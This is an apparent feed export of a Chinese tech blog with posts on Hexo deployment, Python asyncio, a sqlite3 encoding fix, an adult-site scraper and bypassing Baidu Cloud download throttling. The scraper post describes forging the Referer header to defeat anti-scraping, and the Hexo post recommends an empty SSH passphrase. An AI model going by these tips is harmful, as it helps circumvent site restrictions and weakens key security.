      <url>http://akkuman.coding.me/2017/01/10/hexo%E5%9C%A8github%E5%92%8Ccoding-net%E9%83%A8%E7%BD%B2%E5%B9%B6%E5%88%86%E6%B5%81%EF%BC%88%E4%B8%80%EF%BC%89-1.html</url>
      <content type="html"><![CDATA[<h1 id="安装GIT和Node-JS"><a href="#安装GIT和Node-JS" class="headerlink" title="安装GIT和Node.JS"></a>安装GIT和Node.JS</h1><p>首先在自己的电脑上安装好git和node.js，这一步怎么做自己搜索，安装软件都是下一步下一步，应该不难,GIT安装完成后打开git cmd输入<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">git config --global user.name <span class="string">"Your Name"</span></div><div class="line">git config --global user.email <span class="string">"email@example.com"</span></div></pre></td></tr></table></figure></p>
<p>因为Git是分布式版本控制系统，所以，每个机器都必须自报家门：你的名字和Email地址。<br><strong>注意：</strong>git config命令的–global参数，用了这个参数，表示你这台机器上所有的Git仓库都会使用这个配置，当然也可以对某个仓库指定不同的用户名和Email地址。</p>
<a id="more"></a>
<p>#安装并初始化HEXO<br>如果你是在Windows上，请打开Git-CMD<br><img src="http://7xusrl.com1.z0.glb.clouddn.com/git-cmd-exa.png" alt="1"><br>假如你是想在D:\blog\下建立你的博客，请先在D盘下新建文件夹blog<br>在Git-CMD中输入<code>npm install -g hexo-cli</code>回车开始安装hexo<br>安装完成后将git cmd工作目录切换至D:\blog\然后输入<code>hexo init</code>回车，或者直接在git cmd中输入<code>hexo init d:\\blog</code><br>如果你的d:\blog\下的目录形式是<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">.</div><div class="line">├── _config.yml // 网站的配置信息，你可以在此配置大部分的参数。</div><div class="line">├── package.json </div><div class="line">├── scaffolds // 模板文件夹。当你新建文章时，Hexo会根据scaffold来建立文件。</div><div class="line">├── source // 存放用户资源的地方</div><div class="line">|   ├── _drafts</div><div class="line">|   └── _posts</div><div class="line">└── themes // 存放网站的主题。Hexo会根据主题来生成静态页面。</div></pre></td></tr></table></figure></p>
<p>那么你的hexo安装并初始化完成<br>然后输入<code>hexo server</code>启动本地demo，打开浏览器，查看<a href="http://localhost:4000/可以看到自己的博客" target="_blank" rel="external">http://localhost:4000/可以看到自己的博客</a></p>
<h1 id="将之托管到github和coding上"><a href="#将之托管到github和coding上" class="headerlink" title="将之托管到github和coding上"></a>将之托管到github和coding上</h1><h2 id="github项目创建"><a href="#github项目创建" class="headerlink" title="github项目创建"></a>github项目创建</h2><p>1.注册github账号<br>2.创建项目仓库<br>进入<a href="https://github.com/" target="_blank" rel="external">github.com</a>，然后点击右上角 + –&gt;new repository</p>
<p><img src="http://7xusrl.com1.z0.glb.clouddn.com/new%20rep.png" alt="2"></p>
<p>3.在Repository name中填写Github账号名.github.io，点击Create repository，完成创建。</p>
<p><img src="http://7xusrl.com1.z0.glb.clouddn.com/hexo-github-1.png" alt="3"></p>
<h2 id="Coding项目创建"><a href="#Coding项目创建" class="headerlink" title="Coding项目创建"></a>Coding项目创建</h2><p>1.注册Coding账号<br>2.创建项目仓库</p>
<p><img src="http://7xusrl.com1.z0.glb.clouddn.com/hexo-coding-1.png" alt="4"></p>
<p>3.填写项目名称描述创建即可</p>
<p><img src="http://7xusrl.com1.z0.glb.clouddn.com/hexo-coding-2.png" alt="5"></p>
<h2 id="配置SHH"><a href="#配置SHH" class="headerlink" title="配置SHH"></a>配置SHH</h2><p>配置shh key是让本地git项目与远程的github建立联系<br>1.检查是否已经有SSH Key，打开Git Bash，输入<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">cd</span> ~/.ssh</div></pre></td></tr></table></figure></p>
<p>2.如果没有.ssh这个目录，则生成一个新的SSH，输入<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ssh-keygen -t rsa -C <span class="string">"your e-mail"</span></div></pre></td></tr></table></figure></p>
<p>注意1: 此处的邮箱地址，你可以输入自己的邮箱地址；注意2: 此处的「-C」的是大写的「C」<br>接下来几步都直接按回车键,然后系统会要你输入密码<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">Enter passphrase (empty <span class="keyword">for</span> no passphrase):&lt;输入加密串&gt;</div><div class="line">Enter same passphrase again:&lt;再次输入加密串&gt;</div></pre></td></tr></table></figure></p>
<p>这个密码会在你提交项目时使用，如果为空的话提交项目时则不用输入。这个设置是防止别人往你的项目里提交内容。个人建议为空比较方便<br>注意：输入密码的时候没有*字样的，你直接输入就可以了。<br>3.最后看到这样的界面，就成功设置ssh key了<br><img src="http://7xusrl.com1.z0.glb.clouddn.com/wangzhanssh%20key.jpg" alt="6"></p>
<h2 id="添加-SSH-Key-到-GitHub和Coding"><a href="#添加-SSH-Key-到-GitHub和Coding" class="headerlink" title="添加 SSH Key 到 GitHub和Coding"></a>添加 SSH Key 到 GitHub和Coding</h2><p>复制<code>~/.ssh/id_rsa.pub</code>中的内容<br>~是个人文件夹，比如我的电脑上是C:\Users\Administrator.ssh\id_rsa.pub，将其中的文本复制<br>进入github，点击头像–&gt;Setting–&gt;SSH and GPG keys,然后在右侧点击New SSH key，<br>Title随便写，key中填写id_rsa.pub中复制的内容，然后Add SSH key就ok了<br>进入Coding.net，点击头像–&gt;个人设置–&gt;SSH公钥，新增公钥，公钥名称随便，公钥内容是填写id_rsa.pub中复制的内容，有效期可以勾选永久，然后添加ok</p>
<h2 id="测试SSH是否配置成功"><a href="#测试SSH是否配置成功" class="headerlink" title="测试SSH是否配置成功"></a>测试SSH是否配置成功</h2><p>1.打开Git Bash，然后输入<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ssh -T git@github.com</div></pre></td></tr></table></figure></p>
<p>如配置了密码则要输入密码,输完按回车<br>如果显示以下内容，则说明Github中的ssh配置成功。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">Hi username! You<span class="string">'ve successfully authenticated, but GitHub does not</span></div><div class="line">provide shell access.</div></pre></td></tr></table></figure></p>
<p>2.再输入<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ssh -T git@git.coding.net</div></pre></td></tr></table></figure></p>
<p>如果显示以下则说明coding中的ssh配置成功<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Hello username You<span class="string">'ve connected to Coding.net by SSH successfully!</span></div></pre></td></tr></table></figure></p>
<h2 id="创建Github-Pages和Coding-Pages-服务"><a href="#创建Github-Pages和Coding-Pages-服务" class="headerlink" title="创建Github Pages和Coding Pages 服务"></a>创建Github Pages和Coding Pages 服务</h2><p>1.GitHub Pages分两种，一种是你的GitHub用户名建立的username.github.io这样的用户&amp;组织页（站），另一种是依附项目的pages。想建立个人博客是用的第一种，形如cnfeat.github.io这样的可访问的站，每个用户名下面只能建立一个。<br>Coding Pages服务开启在官网说的很详细，不知道请百度<br>2.打开D:\blog文件夹中的_config.yml文件，找到如下位置，填写<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># Deployment</span></div><div class="line"><span class="comment">## Docs: https://hexo.io/docs/deployment.html</span></div><div class="line">deploy:</div><div class="line">- <span class="built_in">type</span>: git</div><div class="line">  repo: </div><div class="line">    github: git@github.com:yourname/yourname.github.io.git,master</div><div class="line">    coding: git@git.coding.net:yourname/yourname.git,coding-pages</div></pre></td></tr></table></figure></p>
<p><strong>注：</strong> (1) 其中yourname替换成你的Github账户名;(2)注意在yml文件中，:后面都是要带空格的。</p>
<p>#部署完成<br>在blog文件夹中空白处右击打开Git Bash输入<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">hexo clean</div><div class="line">hexo d- g</div></pre></td></tr></table></figure></p>
<p>此时，通过访问<a href="http://yourname.github.io和http://yourname.coding.me可以看到默认的Hexo首页面（与之前本地测试时一样）。" target="_blank" rel="external">http://yourname.github.io和http://yourname.coding.me可以看到默认的Hexo首页面（与之前本地测试时一样）。</a></p>
]]></content>
      
        <categories>
            
            <category> Hexo </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Hexo </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Python异步爬虫的学习(一)]]></title>
      <url>http://akkuman.coding.me/2016/12/11/Python%E5%BC%82%E6%AD%A5%E7%88%AC%E8%99%AB%E7%9A%84%E5%AD%A6%E4%B9%A0(%E4%B8%80).html</url>
      <content type="html"><![CDATA[<hr>
<p>本文主要从一下几个方面进行说明:</p>
<ul>
<li>什么是<a href="http://baike.baidu.com/item/%E5%BC%82%E6%AD%A5%E7%BC%96%E7%A8%8B" target="_blank" rel="external">异步(Asynchronous)编程</a></li>
<li>为什么要使用异步编程？</li>
<li>如何利用Python实现异步</li>
</ul>
<hr>
<a id="more"></a>
<h1 id="什么是异步编程"><a href="#什么是异步编程" class="headerlink" title="什么是异步编程"></a>什么是异步编程</h1><h2 id="文章开始前，先简单介绍下各种-IO-模型："><a href="#文章开始前，先简单介绍下各种-IO-模型：" class="headerlink" title="文章开始前，先简单介绍下各种 IO 模型："></a>文章开始前，先简单介绍下各种 IO 模型：</h2><h3 id="最容易做的是阻塞-IO"><a href="#最容易做的是阻塞-IO" class="headerlink" title="最容易做的是阻塞 IO"></a>最容易做的是阻塞 IO</h3><p>即读写数据时，需要等待操作完成，才能继续执行。进阶的做法就是用多线程来处理需要 IO 的部分，缺点是开销会有些大。</p>
<h3 id="接着是非阻塞-IO"><a href="#接着是非阻塞-IO" class="headerlink" title="接着是非阻塞 IO"></a>接着是非阻塞 IO</h3><p>即读写数据时，如果暂时不可读写，则立刻返回，而不等待。因为不知道什么时候是可读写的，所以轮询时可能会浪费 CPU 时间。</p>
<h3 id="然后是-IO-复用"><a href="#然后是-IO-复用" class="headerlink" title="然后是 IO 复用"></a>然后是 IO 复用</h3><p>即在读写数据前，先检查哪些描述符是可读写的，再去读写。select 和 poll 就是这样做的，它们会遍历所有被监视的描述符，查看是否满足，这个检查的过程是阻塞的。而 epoll、kqueue 和 /dev/poll 则做了些改进，事先注册需要检查哪些描述符的哪些事件，当状态发生变化时，内核会调用对应的回调函数，将这些描述符保存下来；下次获取可用的描述符时，直接返回这些发生变化的描述符即可。</p>
<h3 id="再之后是信号驱动"><a href="#再之后是信号驱动" class="headerlink" title="再之后是信号驱动"></a>再之后是信号驱动</h3><p>即描述符就绪时，内核发送 SIGIO 信号，再由信号处理程序去处理这些信号即可。不过信号处理的时机是从内核态返回用户态时，感觉也得把这些事件收集起来才好处理，有点像模拟 IO 复用了。</p>
<h3 id="最后是异步-IO"><a href="#最后是异步-IO" class="headerlink" title="最后是异步 IO"></a>最后是异步 IO</h3><p>即读写数据时，只注册事件，内核完成读写后（读取的数据会复制到用户态），再调用事件处理函数。这整个过程都不会阻塞调用线程，不过实现它的操作系统比较少，Windows 上有比较成熟的 IOCP，Linux 上的 AIO 则有不少缺点。<br>虽然真正的异步 IO 需要中间任何步骤都没有阻塞，这对于某些只是偶尔需要处理 IO 请求的情况确实有用（比如文本编辑器偶尔保存一下文件）；但对于服务器端编程的大多数情况而言，它的主线程就是用来处理 IO 请求的，如果在空闲时不阻塞在 IO 等待上，也没有别的事情能做，所以本文就不纠结这个异步是否名副其实了。</p>
<h2 id="然后我们了解一下事件循环-Event-Loop"><a href="#然后我们了解一下事件循环-Event-Loop" class="headerlink" title="然后我们了解一下事件循环(Event Loop)"></a>然后我们了解一下事件循环(Event Loop)</h2><p>Event Loop 是一个很重要的概念，指的是计算机系统的一种运行机制。</p>
<p><img src="http://image.beekka.com/blog/201310/2013102001.png" alt="Event Loop"></p>
<p>我们一般的单线程程序中，所有任务需要排队，前一个任务结束，才会执行后一个任务。如果前一个任务耗时很长，后一个任务就不得不一直等着。</p>
<p>如果排队是因为计算量大，CPU忙不过来，倒也算了，但是很多时候CPU是闲着的，因为IO设备（输入输出设备）很慢（比如Ajax操作从网络读取数据），不得不等着结果出来，再往下执行。</p>
<p>那么这时主线程完全可以不管IO设备，挂起处于等待中的任务，先运行排在后面的任务。等到IO设备返回了结果，再回过头，把挂起的任务继续执行下去。</p>
<p>于是，所有任务可以分成两种，一种是同步任务（synchronous），另一种是异步任务（asynchronous）。同步任务指的是，在主线程上排队执行的任务，只有前一个任务执行完毕，才能执行后一个任务；异步任务指的是，不进入主线程、而进入”任务队列”（task queue）的任务，只有”任务队列”通知主线程，某个异步任务可以执行了，该任务才会进入主线程执行。<br>具体来说，异步执行的运行机制如下。（同步执行也是如此，因为它可以被视为没有异步任务的异步执行。）</p>
<pre><code>（1）所有同步任务都在主线程上执行，形成一个执行栈（execution context stack）。
（2）主线程之外，还存在一个&quot;任务队列&quot;（task queue）。只要异步任务有了运行结果，就在&quot;任务队列&quot;之中放置一个事件。
（3）一旦&quot;执行栈&quot;中的所有同步任务执行完毕，系统就会读取&quot;任务队列&quot;，看看里面有哪些事件。那些对应的异步任务，于是结束等待状态，进入执行栈，开始执行。
（4）主线程不断重复上面的第三步。
</code></pre><p>下图就是主线程和任务队列的示意图。</p>
<p><img src="http://image.beekka.com/blog/2014/bg2014100801.jpg" alt=""></p>
<p>只要主线程空了，就会去读取”任务队列”，这个过程会不断重复。</p>
<p>所谓异步是相对于同步（Synchronous）的概念来说的，之所以容易造成混乱，是因为刚开始接触这两个概念时容易把同步看做是同时，而同时不是意味着并行（Parallel）吗？然而实际上同步或者异步是针对于时间轴的概念，同步意味着顺序、统一的时间轴，而异步则意味着乱序、效率优先的时间轴。比如在爬虫运行时，先抓取 A 页面，然后从中提取下一层页面 B 的链接，此时的爬虫程序的运行只能是同步的，B 页面只能等到 A 页面处理完成之后才能抓取；然而对于独立的两个页面 A1 和 A2，在处理 A1 网络请求的时间里，与其让 CPU 空闲而 A2 等在后面，不如先处理 A2，等到谁先完成网络请求谁就先来进行处理，这样可以更加充分地利用 CPU，但是 A1 和 A2 的执行顺序则是不确定的，也就是异步的。</p>
<h1 id="为什么要使用异步编程？"><a href="#为什么要使用异步编程？" class="headerlink" title="为什么要使用异步编程？"></a>为什么要使用异步编程？</h1><p>CPU的速度远远快于磁盘、网络等IO。在一个线程中，CPU执行代码的速度极快，然而，一旦遇到IO操作，如读写文件、发送网络数据时，就需要等待IO操作完成，才能继续进行下一步操作。这种情况称为同步IO。</p>
<p>在IO操作的过程中，当前线程被挂起，而其他需要CPU执行的代码就无法被当前线程执行了。</p>
<p>因为一个IO操作就阻塞了当前线程，导致其他代码无法执行，所以我们必须使用多线程或者多进程来并发执行代码，为多个用户服务。每个用户都会分配一个线程，如果遇到IO导致线程被挂起，其他用户的线程不受影响。</p>
<p>多线程和多进程的模型虽然解决了并发问题，但是系统不能无上限地增加线程。由于系统切换线程的开销也很大，所以，一旦线程数量过多，CPU的时间就花在线程切换上了，真正运行代码的时间就少了，结果导致性能严重下降。</p>
<p>由于我们要解决的问题是CPU高速执行能力和IO设备的龟速严重不匹配，多线程和多进程只是解决这一问题的一种方法。</p>
<p>另一种解决IO问题的方法是异步IO。当代码需要执行一个耗时的IO操作时，它只发出IO指令，并不等待IO结果，然后就去执行其他代码了。一段时间后，当IO返回结果时，再通知CPU进行处理。</p>
<h1 id="如何利用Python实现异步"><a href="#如何利用Python实现异步" class="headerlink" title="如何利用Python实现异步"></a>如何利用Python实现异步</h1><p>我们首先需要了解以下几个概念：</p>
<ul>
<li>Event Loop</li>
<li>Coroutine</li>
</ul>
<p>其中Event Loop在前面已经解释过<br>Coroutine是协程，具体解释可以查阅<a href="http://www.liaoxuefeng.com/wiki/0014316089557264a6b348958f449949df42a6d3a2e542c000/001432090171191d05dae6e129940518d1d6cf6eeaaa969000" target="_blank" rel="external">协程</a></p>
<p>Python 3.5 以后推荐使用 async/await 关键词来定义协程，它具有如下特性：</p>
<ul>
<li>通过 await 将可能阻塞的行为挂起，直到有结果之后继续执行，Event loop 也是据此来对多个协程的执行进行调度的；</li>
<li>协程并不像一般的函数一样，通过 coro() 进行调用并不会执行它，而只有将它放入 Event loop 进行调度才能执行。</li>
</ul>
<p>这里我就从廖大哪里搬运个小例子(有改动)<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> threading</div><div class="line"><span class="keyword">import</span> asyncio</div><div class="line"></div><div class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">hello</span><span class="params">()</span>:</span></div><div class="line">    print(<span class="string">'Hello world! (%s)'</span> % threading.currentThread())</div><div class="line">    <span class="keyword">await</span> asyncio.sleep(<span class="number">1</span>)</div><div class="line">    print(<span class="string">'Hello again! (%s)'</span> % threading.currentThread())</div><div class="line"></div><div class="line">loop = asyncio.get_event_loop()</div><div class="line">tasks = [hello(), hello()]</div><div class="line">loop.run_until_complete(asyncio.wait(tasks))</div><div class="line">loop.close()</div></pre></td></tr></table></figure></p>
<p>执行结果</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">Hello world! (&lt;_MainThread(MainThread, started <span class="number">140735195337472</span>)&gt;)</div><div class="line">Hello world! (&lt;_MainThread(MainThread, started <span class="number">140735195337472</span>)&gt;)</div><div class="line">(暂停约<span class="number">1</span>秒)</div><div class="line">Hello again! (&lt;_MainThread(MainThread, started <span class="number">140735195337472</span>)&gt;)</div><div class="line">Hello again! (&lt;_MainThread(MainThread, started <span class="number">140735195337472</span>)&gt;)</div></pre></td></tr></table></figure>
<p>其中sleep是我们模拟的io用时，我么你可以从这个小例子中看出，执行hello()的时候，io并未堵塞，而是继续向下执行<br>hello()会首先打印出Hello world!，然后，由于asyncio.sleep()是一个coroutine，所以线程不会等待asyncio.sleep()，而是直接中断并执行下一个消息循环。当asyncio.sleep()完成时，线程就可以接着执行下一行语句。</p>
<p>下一篇文章将在此基础上实现一个简洁、普适的爬虫框架</p>
]]></content>
      
        <categories>
            
            <category> Python </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Python </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[javbus爬虫-老司机你值得拥有]]></title>
      <url>http://akkuman.coding.me/2016/12/06/javbus%E7%88%AC%E8%99%AB-%E8%80%81%E5%8F%B8%E6%9C%BA%E4%BD%A0%E5%80%BC%E5%BE%97%E6%8B%A5%E6%9C%89.html</url>
      <content type="html"><![CDATA[<hr>
<h1 id="起因"><a href="#起因" class="headerlink" title="起因"></a>起因</h1><hr>
<p>有个朋友叫我帮忙写个爬虫，爬取javbus5上面所有的详情页链接，也就是所有的<a href="https://www.javbus5.com/SRS-055这种链接，" target="_blank" rel="external">https://www.javbus5.com/SRS-055这种链接，</a><br>我一看，嘿呀，这是司机的活儿啊，我绝对不能辱没我老司机的名声（被败坏了可不好），于是开始着手写了</p>
<hr>
<h1 id="构思"><a href="#构思" class="headerlink" title="构思"></a>构思</h1><hr>
<ul>
<li>爬虫调度启动程序crawler.py</li>
<li>页面下载程序downloader.py</li>
<li>页面解析程序pageparser.py</li>
<li>数据库入库与去重管理程序controler.py</li>
</ul>
<a id="more"></a>
<p>爬取入口为第一页，当页面中存在下一页的超链接继续往下爬，这是个死循环，跳出条件为没有了下一页的链接</p>
<p>在某一页中解析页面，返回所有的详情页链接，利用迭代器返回，然后在主程序中调用解析程序对页面信息进行解析并包装成字典返回，其中用详情页网址作为数据库主键，其他信息依次写入数据库</p>
<p>当这一页所有的子链接爬取完成后，继续爬取下一页。</p>
<p>将数据存入数据库，用的是sqllite3,失败的网址页存入一个fail_url.txt。</p>
<p>对于增量爬取，我是这么做的，当爬取到相同的网址时结束程序，这么做也有漏洞，才疏学浅，我没想到太好的办法，希望有好办法的给我说一声（布隆过滤正在研究之中），如果用数据库查询去重，那么势必导致二次爬取，我们都知道，爬虫更多的时间是花在网络等待上</p>
<hr>
<h1 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h1><hr>
<p>在写爬虫的过程中遇到了一些问题</p>
<ol>
<li><p>在墙内爬不动，爬取几个之后就失败，这个解决方案只需要全局翻墙爬取就可以了</p>
</li>
<li><p>本来之前加了多线程并发爬取，但是发现爬取一段时间后会封ip导致整体无法运行，本来想搞个代理池进行并发，结果网上免费的代理太慢太慢，根本打不开网页，于是就改回了单线程</p>
</li>
<li><p>就是我的那个不完善的增量爬取，导致了你一次爬取就需要爬取完成，不然数据库里面存在你之前爬到的，爬取到你已有的会直接停止</p>
</li>
<li><p>存在反扒策略<br>详情页中的磁力链接是ajax动态加载的，通过分析抓包，可以在XHR中找到是一个get请求，至于参数，我开始不知道怎么得来的，后来在html代码中找到了，我放几张图大家就明白了<br><img src="http://7xusrl.com1.z0.glb.clouddn.com/javbus_001.jpg" alt="1"></p>
<p>我们通过对响应内容的查看可以发现磁力的加载访问了类似于这样一个网址</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">https://www.javbus5.com/ajax/uncledatoolsbyajax.php?gid=30100637207&amp;lang=zh&amp;img=https://pics.javbus.info/cover/59pc_b.jpg&amp;uc=0&amp;floor=921</div></pre></td></tr></table></figure>
<p>那么这些get参数是从哪里来呢，这就是通过经验与基本功去发现了</p>
<p>通过对html源文件的搜索，我们即可直接发现答案<br><img src="http://7xusrl.com1.z0.glb.clouddn.com/javbus_003.png" alt="3"><br><img src="http://7xusrl.com1.z0.glb.clouddn.com/javbus_004.png" alt="4"><br>通过分析发现，后面的floor是个随机数参数，一般这种参数可以去除无影响，事实也是这样</p>
<p>我利用HttpRequest模拟发包，对这个请求直接get，发现所有数据隐藏<br><img src="http://7xusrl.com1.z0.glb.clouddn.com/javbus_002.png" alt="2"></p>
<p>那么肯定是有反扒的策略，伪造请求头，反扒也就那么几种，通过分析发现是同源策略，对Referer请求头伪造成来源网址就可以直接获取到内容了<br><img src="http://7xusrl.com1.z0.glb.clouddn.com/javbus_005.png" alt="5"><br><img src="http://7xusrl.com1.z0.glb.clouddn.com/javbus_006.jpg" alt="6"><br><img src="http://7xusrl.com1.z0.glb.clouddn.com/javbus_007.png" alt="7"></p>
</li>
<li><p>常见的Python2.x编码问题,全部转换为unicode字节流就可以了<br> 这个问题在我博客中已经记录了<a href="http://www.53xiaoshuo.com/Python/77.html" target="_blank" rel="external">http://www.53xiaoshuo.com/Python/77.html</a><br> 有兴趣的童鞋可以看看</p>
</li>
<li><p>遇到的最闹心问题是详情页的项目抓取，有的详情页的类别不同，我开始只分析了一个页面，导致写的规则在有的页面上频频出错<br>导致后面对抓取规则进行了大改,重写了分析规则，用了个笨办法，毕竟那小块的html写的十分不规范，正则规则有三种，挺烦人<br><img src="http://7xusrl.com1.z0.glb.clouddn.com/javbus_008.png" alt="8"><br><img src="http://7xusrl.com1.z0.glb.clouddn.com/javbus_009.jpg" alt="9"><br>比如上图的两个就不同，html代码更是稀烂，需要判断有没有这个项，没有就设置空字节入库</p>
<p>在这其中纠结了一个问题<br><img src="http://7xusrl.com1.z0.glb.clouddn.com/javbus_010.png" alt="10"></p>
<p>就是对于这两种的比较，我想上面这种变成下面这种，毕竟第一种的话，soup.find要执行两次，但是下面这种又要比上面那个多一行，丑一点<br>最后我选择了第二种，所有的信息分析代码就不贴了，具体想看的直接看我的代码文件就好了</p>
</li>
</ol>
<hr>
<h1 id="小Tips"><a href="#小Tips" class="headerlink" title="小Tips"></a>小Tips</h1><hr>
<ol>
<li><p>对于动态加载的内容的爬取，能不用selenium去模拟浏览器爬取就不用，耗费资源，更好的是自己分析网络请求，然后构造</p>
</li>
<li><p>对于页面信息的解析，要多看几个页面，看是否相同，别到时候做多事情</p>
</li>
<li><p>多看别人的博客学习思路</p>
</li>
</ol>
<hr>
<h1 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h1><hr>
<p>爬虫依赖的第三方库有Requests，BeautifulSoup，使用前请先pip install这两个第三方库</p>
<hr>
<h1 id="测试展与地址"><a href="#测试展与地址" class="headerlink" title="测试展与地址"></a>测试展与地址</h1><hr>
<p><img src="http://7xusrl.com1.z0.glb.clouddn.com/javbus_011.jpg" alt="11"><br><img src="http://7xusrl.com1.z0.glb.clouddn.com/javbus_012.jpg" alt="12"></p>
<hr>
<h2 id="代码地址"><a href="#代码地址" class="headerlink" title="代码地址:"></a>代码地址:</h2><hr>
<ul>
<li><em>coding.net</em>    <a href="https://coding.net/u/Akkuman/p/Javbus_crawler" target="_blank" rel="external">javbus_crawler</a></li>
<li><em>github.com</em>    <a href="https://github.com/akkuman/Javbus_crawler" target="_blank" rel="external">javbus_crawler</a></li>
</ul>
<p>司机的名声总算是没有辱没，秋名山依旧，嘿嘿<br><img src="https://ss3.bdstatic.com/70cFv8Sh_Q1YnxGkpoWK1HF6hhy/it/u=2070695546,2193961465&amp;fm=116&amp;gp=0.jpg" alt="13"></p>
<p><strong>转载请注明来源作者</strong></p>
<ul>
<li>博客：53xiaoshuo.com | hacktech.cn</li>
<li>作者：Akkuman</li>
</ul>
]]></content>
      
        <categories>
            
            <category> Python </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Python </tag>
            
            <tag> life </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[突破百度云限速与网页限制批量下载]]></title>
      <url>http://akkuman.coding.me/2016/12/06/%E7%AA%81%E7%A0%B4%E7%99%BE%E5%BA%A6%E4%BA%91%E9%99%90%E9%80%9F%E4%B8%8E%E7%BD%91%E9%A1%B5%E9%99%90%E5%88%B6%E6%89%B9%E9%87%8F%E4%B8%8B%E8%BD%BD.html</url>
      <content type="html"><![CDATA[<p><strong>百度云限速比较坑，现在基本200k左右</strong><br><strong>很多人都知道了，但是总有朋友问我，我说明一下</strong></p>
<h1 id="首先下载IDM-最好支持正版"><a href="#首先下载IDM-最好支持正版" class="headerlink" title="首先下载IDM(最好支持正版)"></a>首先下载IDM(最好支持正版)</h1><p>下载链接：<br><a href="https://eyun.baidu.com/s/3nvg3jdf" target="_blank" rel="external">百度云shaoit</a></p>
<h1 id="开始下载："><a href="#开始下载：" class="headerlink" title="开始下载："></a>开始下载：</h1><p>一般的话，小文件直接打开浏览器就可以下载</p>
<h1 id="大文件下载："><a href="#大文件下载：" class="headerlink" title="大文件下载："></a>大文件下载：</h1><p>首先在chrome浏览器中装上一个User-Agent Switcher for (Google)Chrome插件,然后选择安卓手机，也就是打开这个的手机页面，然后直接用IDM下载</p>
<h1 id="批量下载与外链获取"><a href="#批量下载与外链获取" class="headerlink" title="批量下载与外链获取"></a>批量下载与外链获取</h1><p>使用这个脚本，具体看链接内介绍</p>
<a id="more"></a>
<p><a href="https://greasyfork.org/zh-CN/scripts/23635-%E7%99%BE%E5%BA%A6%E7%BD%91%E7%9B%98%E7%9B%B4%E6%8E%A5%E4%B8%8B%E8%BD%BD%E5%8A%A9%E6%89%8B" target="_blank" rel="external">https://greasyfork.org/zh-CN/scripts/23635-%E7%99%BE%E5%BA%A6%E7%BD%91%E7%9B%98%E7%9B%B4%E6%8E%A5%E4%B8%8B%E8%BD%BD%E5%8A%A9%E6%89%8B</a></p>
<h2 id="如何安装用户脚本"><a href="#如何安装用户脚本" class="headerlink" title="如何安装用户脚本"></a>如何安装用户脚本</h2><ul>
<li>Firefox 及相关的浏览器：Greasemonkey。</li>
<li>Google Chrome、Chromium 及相关的浏览器：Tampermonkey。</li>
<li>Opera (版本 15 及更晚)：Tampermonkey 或者 Violentmonkey。</li>
<li>Opera 版本 12 及更早原生支持用户脚本。但 Violentmonkey 能提供更友好的界面和更好的兼容性。</li>
</ul>
]]></content>
      
        <categories>
            
            <category> life </category>
            
        </categories>
        
        
        <tags>
            
            <tag> life </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[ProgrammingError: You must not use 8-bit bytestrings...]]></title>
      <url>http://akkuman.coding.me/2016/12/06/ProgrammingError-You-must-not-use-8-bit-bytestrings.html</url>
      <content type="html"><![CDATA[<h1 id="问题出现："><a href="#问题出现：" class="headerlink" title="问题出现："></a>问题出现：</h1><p>You must not use 8-bit bytestrings unless you use a text_factory that can interpret 8-bit bytestrings (like text_factory = str). It is highly recommended that you instead just switch your application to Unicode strings.</p>
<h1 id="产生原因："><a href="#产生原因：" class="headerlink" title="产生原因："></a>产生原因：</h1><p>问题在用Python的sqlite3操作数据库要插入的字符串中含有非ascii字符时产生，做插入的时候就报当前这个错误。</p>
<h1 id="解决方法："><a href="#解决方法：" class="headerlink" title="解决方法："></a>解决方法：</h1><h2 id="1-按提示"><a href="#1-按提示" class="headerlink" title="1. 按提示"></a>1. 按提示</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">connection = sqlite3.connect(...)</div><div class="line">connection.text_factory = str</div></pre></td></tr></table></figure>
